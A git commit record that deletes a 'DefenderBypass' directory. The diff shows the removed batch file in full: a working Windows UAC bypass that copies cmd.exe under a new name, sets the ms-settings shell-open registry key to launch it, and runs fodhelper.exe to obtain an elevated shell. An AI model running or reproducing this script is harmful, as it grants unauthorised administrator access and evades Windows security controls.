6111a96c108b8620c0ba04971df926a65609190d
Itayos <66430298+ItayosP@users.noreply.github.com>
2024-09-08 16:18:49 +0300

    Delete DefenderBypass directory

--- DefenderBypass/main.bat
+++
@@ -1,5 +0,0 @@
-copy C:\Windows\System32\cmd.exe C:\Users\itayp\Downloads\notme.exe
-
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\itayp\Downloads\notme.exe" /f
-
-fodhelper.exe
